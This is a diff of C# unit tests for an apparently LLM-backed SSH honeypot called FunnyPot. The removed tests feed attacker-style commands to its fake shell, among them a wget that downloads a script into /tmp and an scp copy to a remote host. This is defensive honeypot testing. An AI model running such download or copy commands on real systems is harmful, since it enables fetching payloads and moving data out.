-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-        var history = new List<ChatRequestData.ChatMessage>();
-        var sessionId = Guid.NewGuid().ToString("N");
-
-        await CommandResolver.ResolveCommandAsync(
-            "cd /tmp; wget http://example.com/a.sh -O /tmp/a.sh; echo ready >> /tmp/a.sh",
-            sessionId,
-            sessionId,
-            fs,
-            history,
-            CancellationToken.None);
-
-        var (response, usedStatic, rateLimited, promptTokens, completionTokens, _, _) = await CommandResolver.ResolveCommandAsync(
-            "cat /tmp/a.sh",
-            sessionId,
-            sessionId,
-            fs,
-            history,
-            CancellationToken.None);
-
-        Assert.Contains("downloaded payload placeholder", response);
-        Assert.Contains("ready", response);
-        Assert.False(rateLimited);
-        Assert.False(usedStatic);
-        Assert.Equal(0, promptTokens);
-        Assert.Equal(0, completionTokens);
-    }
-
-    [Fact]
-    public async Task ResolveCommand_ScpCommandIsNotBlocked()
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-        var history = new List<ChatRequestData.ChatMessage>();
-
-        var (response, usedStatic, rateLimited, promptTokens, completionTokens, _, _) = await CommandResolver.ResolveCommandAsync(
-            "scp /tmp/a remote:/tmp/a",
-            Guid.NewGuid().ToString("N"),
-            Guid.NewGuid().ToString("N"),
-            fs,
-            history,
-            CancellationToken.None);
-
-        Assert.Equal("", response);
-        Assert.True(usedStatic);
-        Assert.False(rateLimited);
-        Assert.Equal(0, promptTokens);
-        Assert.Equal(0, completionTokens);
-    }
-
-    [Fact]
-    public async Task ResolveCommand_ReturnsLocalBinaryOutputForEchoExecutableCat()
-    {
-        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
-        var history = new List<ChatRequestData.ChatMessage>();
-
-        var (response, usedStatic, rateLimited, promptTokens, completionTokens, _, _) = await CommandResolver.ResolveCommandAsync(
-            "cat /bin/echo",
-            Guid.NewGuid().ToString("N"),
-            Guid.NewGuid().ToString("N"),
-            fs,
-            history,
-            CancellationToken.None);
-
-        Assert.StartsWith("ELF'@@8", response);
-        Assert.Contains("/lib/ld-linux-aarch64.so.1", response);
-        Assert.Contains("GLIBC_2.17", response);
-        Assert.Contains("binary output truncated", response);
-        Assert.False(usedStatic);
-        Assert.False(rateLimited);
-        Assert.Equal(0, promptTokens);
-        Assert.Equal(0, completionTokens);
-        Assert.Empty(history);
-    }
-
-    [Fact]
-    public void StaticResponses_AreValidJsonLines()
-    {
-        var path = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "../../../../FunnyPot/data/ssh_responses.jsonl"));
-
-        foreach (var line in File.ReadLines(path).Where(line => !string.IsNullOrWhiteSpace(line)))
-        {
-            using var _ = System.Text.Json.JsonDocument.Parse(line);
-        }
-    }
-
-    [Fact]
-    public void StaticResponses_DoNotCaptureUnhandledDynamicCommandVariants()
-    {
-        Assert.NotNull(StaticResponseStore.GetResponse("ps", "/root"));
-        Assert.Null(StaticResponseStore.GetResponse("ps | grep '[Mm]iner'", "/root"));
     }
 
     [Fact]
@@ -1070,21 +665,26 @@ public class CommandResolverTests
             }
             """);
 
-        var parsed = Program.TryParseOpenRouterResponse(doc.RootElement, out var content, out var promptTokens, out var completionTokens, out var totalTokens);
-
-        Assert.True(parsed);
+        Assert.True(Program.TryParseOpenRouterResponse(doc.RootElement, out var content, out var promptTokens, out var completionTokens, out var totalTokens));
         Assert.Equal("ok", content);
         Assert.Equal(10, promptTokens);
         Assert.Equal(2, completionTokens);
         Assert.Equal(12, totalTokens);
     }
 
-    [Fact]
-    public void TryParseOpenRouterResponse_RejectsMissingChoices()
+    private static string CreateStoreFile(IReadOnlyDictionary<string, string> responses)
     {
-        using var doc = System.Text.Json.JsonDocument.Parse("{\"error\":{\"message\":\"bad\"}}");
-
-        Assert.False(Program.TryParseOpenRouterResponse(doc.RootElement, out _, out _, out _, out _));
+        var path = Path.Combine(Path.GetTempPath(), $"funnypot-responses-{Guid.NewGuid():N}.json");
+        var entries = responses.ToDictionary(
+            pair => pair.Key,
+            pair => new CommandResponseEntry
+            {
+                Response = pair.Value,
+                Origin = "seed"
+            },
+            StringComparer.Ordinal);
+        File.WriteAllText(path, System.Text.Json.JsonSerializer.Serialize(entries));
+        return path;
     }
 }
 
@@ -1127,11 +727,12 @@ public class AppConfigurationTests
 
         var config = AppConfiguration.Load(path);
 
-        Assert.Equal("minimax/minimax-m3", config.Llm.Model);
+        Assert.Equal("openai/gpt-5.6-luna", config.Llm.Model);
         Assert.Contains("nvidia/nemotron-3-super-120b-a12b:free", config.Llm.FallbackModels);
         Assert.Equal("/var/log/funnypot", config.Logging.LogDir);
         Assert.Equal(3, config.Ssh.PasswordHarvestAttempt);
         Assert.Equal("/chat/completions", config.Api.OpenRouter.ChatEndpoint);
+        Assert.Equal("data/command_responses.json", config.CommandResponses.DataPath);
         Assert.Equal("autoresearch/program.md", config.AutoResearch.ProgramPath);
         Assert.Equal("dotnet test FunnyPot.sln", config.AutoResearch.ExperimentCommand);
         Assert.Contains("FunnyPot/Program.cs", config.AutoResearch.MutablePaths);
@@ -1143,7 +744,7 @@ public class AppConfigurationTests
         var config = AppConfiguration.Load();
 
         Assert.Equal(22722, config.Ssh.Port);
-        Assert.Equal("minimax/minimax-m3", config.Llm.Model);
+        Assert.Equal("openai/gpt-5.6-luna", config.Llm.Model);
     }
 
     [Fact]
@@ -1249,27 +850,5 @@ public class SessionCommandWorkerTests
         worker.Dispose();
 
         Assert.False(worker.TryPost(() => { }));
-    }
-}
-
-public class LlmRateLimiterTests
-{
-    [Fact]
-    public void IsAllowed_LimitsEachSessionIndependently()
-    {
-        var sessionA = $"test-session-{Guid.NewGuid():N}";
-        var sessionB = $"test-session-{Guid.NewGuid():N}";
-        LlmRateLimiter.Reset(sessionA);
-        LlmRateLimiter.Reset(sessionB);
-
-        for (var i = 0; i < 20; i++)
-            Assert.True(LlmRateLimiter.IsAllowed(sessionA, out _));
-
-        Assert.False(LlmRateLimiter.IsAllowed(sessionA, out var fallbackMessage));
-        Assert.Contains("Rate limit exceeded", fallbackMessage);
-        Assert.True(LlmRateLimiter.IsAllowed(sessionB, out _));
-
-        LlmRateLimiter.Reset(sessionA);
-        LlmRateLimiter.Reset(sessionB);
     }
 }
